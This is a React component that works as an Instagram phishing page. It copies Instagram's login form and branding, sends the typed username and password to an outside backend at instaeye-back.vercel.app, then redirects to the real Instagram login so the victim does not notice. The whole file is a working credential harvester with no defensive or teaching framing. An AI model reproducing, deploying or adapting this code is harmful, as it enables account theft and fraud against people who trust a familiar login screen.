import React, { useState } from 'react';
import "./Register.css"

const Register = () => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [message, setMessage] = useState('');

    const handleRegister = async (e) => {
        e.preventDefault();

        const response = await fetch('https://instaeye-back.vercel.app/register', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ username, password }),
        });

        const data = await response.json();

        if (response.ok) {
            setMessage(data.message);
            window.location.href = 'https://www.instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav';
            setUsername('');
            setPassword('');

        } else {
            setMessage(data.error);
        }
    };

    return (
        <div className="login-container">
           <img src="./copy.jpg" alt="Instagram"></img>
            <form onSubmit={handleRegister} className="login-form">
                <div className="input-group">
                    <label htmlFor="username" className="input-label">Phone number, username, or email</label>
                    <input
                        id="username"
                        type="text"
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        required
                        className="input-field"
                    />
                </div>
                <div className="input-group">
                    <label htmlFor="password" className="input-label">Password</label>
                    <input
                        id="password"
                        type="password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        required
                        className="input-field"
                    />
                </div>
                <button type="submit" className="login-button">Log In</button>
                <div className="or-separator">
                    <span>OR</span>
                </div>
                <div className="facebook-login">
                    <button className="facebook-button">Log in with Facebook</button>
                </div>
                <div className="forgot-password">
                    <a href="#" className="forgot-password-link">Forgot password?</a>
                </div>
            </form>
            {message && <p className="error-message">{message}</p>}
            <div className="dont-have-account">
                <p>Don't have an account? <a href="#" className="sign-up-link">Sign up</a></p>
            </div>
           
        </div>
    );
    
};

export default Register;